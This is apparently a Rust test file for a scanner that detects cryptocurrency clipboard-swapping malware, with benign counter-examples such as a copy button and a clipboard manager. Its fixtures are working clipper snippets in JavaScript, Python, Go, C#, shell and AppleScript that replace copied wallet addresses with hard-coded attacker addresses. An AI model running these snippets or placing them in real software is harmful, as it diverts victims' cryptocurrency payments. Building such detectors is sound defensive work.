use super::super::{Kind, ids, scan_text};

const ATTACKER: &str = "0xD62Eb957610d49f77cFce8bCc9827b5428D790E6";

#[test]
fn a_clipper_in_any_language_fails() {
    let js = format!(
        "setInterval(async () => {{ const t = await navigator.clipboard.readText(); if (/^0x[a-fA-F0-9]{{40}}$/.test(t)) navigator.clipboard.writeText('{ATTACKER}'); }}, 500);\n"
    );
    let got = scan_text("src/bg.js", &js, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CLIPBOARD-SWAP", true)], "{got:?}");
    assert!(got[0].note.contains("a clipper swaps the address you copied"), "{}", got[0].note);
    assert!(got[0].note.contains("EVM (Ethereum, BSC, Tempo)"), "{}", got[0].note);
    assert!(got[0].note.contains("recognises wallet addresses by pattern"), "{}", got[0].note);
    let py = "import pyperclip, re, time\nwhile True:\n    c = pyperclip.paste()\n    if re.match(r'^T[a-km-zA-HJ-NP-Z1-9]{33}$', c): pyperclip.copy('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')\n    time.sleep(0.5)\n";
    assert_eq!(ids(&scan_text("clip.py", py, Kind::Repo)), [("SUSPECT-CLIPBOARD-SWAP", true)]);
    let go = "txt, _ := clipboard.ReadAll()\nif re.MatchString(txt) { clipboard.WriteAll(\"bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq\") }\n";
    assert_eq!(ids(&scan_text("main.go", go, Kind::Repo)), [("SUSPECT-CLIPBOARD-SWAP", true)]);
    let cs = "var t = Clipboard.GetText(); if (Regex.IsMatch(t, \"^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$\")) Clipboard.SetText(mine);";
    assert_eq!(ids(&scan_text("Program.cs", cs, Kind::Repo)), [("SUSPECT-CLIPBOARD-SWAP", true)]);
    let sh = "while true; do c=$(pbpaste); case $c in 0x*) echo 0xD62Eb957610d49f77cFce8bCc9827b5428D790E6 | pbcopy;; esac; sleep 1; done\n";
    assert_eq!(ids(&scan_text("run.sh", sh, Kind::Repo)), [("SUSPECT-CLIPBOARD-SWAP", true)]);
    let applescript = "set the clipboard to \"TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t\"\nget the clipboard\n";
    assert_eq!(ids(&scan_text("swap.scpt.sh", applescript, Kind::Repo)), [("SUSPECT-CLIPBOARD-SWAP", true)]);
}

#[test]
fn reads_without_writes_warn_and_writes_alone_are_buttons() {
    let form = "const pasted = await navigator.clipboard.readText(); if (!/^0x[a-fA-F0-9]{40}$/.test(pasted)) setError('not an address');\n";
    let got = scan_text("src/form.ts", form, Kind::Repo);
    assert_eq!(ids(&got), [("SUSPECT-CLIPBOARD-SWAP", false)], "validation only");
    assert!(got[0].note.contains("without writing it"), "{}", got[0].note);
    assert_eq!(
        ids(&scan_text("ext/content.js", form, Kind::Installed)),
        [("SUSPECT-CLIPBOARD-SWAP", true)],
        "installed code fails"
    );
    let button = "onClick={() => navigator.clipboard.writeText('0xdAC17F958D2ee523a2206206994597C13D831ec7')}";
    assert!(scan_text("src/Copy.tsx", button, Kind::Repo).is_empty(), "a copy button reads nothing");
    let manager =
        "const t = await navigator.clipboard.readText(); history.push(t); navigator.clipboard.writeText(history[0]);\n";
    assert!(scan_text("src/history.js", manager, Kind::Repo).is_empty(), "a clipboard manager has no addresses");
    let test = "test('swaps', () => { navigator.clipboard.readText(); navigator.clipboard.writeText('0xD62Eb957610d49f77cFce8bCc9827b5428D790E6'); });";
    assert_eq!(
        ids(&scan_text("src/__tests__/clip.test.js", test, Kind::Repo)),
        [("SUSPECT-CLIPBOARD-SWAP", false)],
        "tests warn"
    );
    assert!(
        scan_text("notes.md", "pbpaste | pbcopy 0xD62Eb957610d49f77cFce8bCc9827b5428D790E6", Kind::Repo).is_empty(),
        "prose isn't read"
    );
}
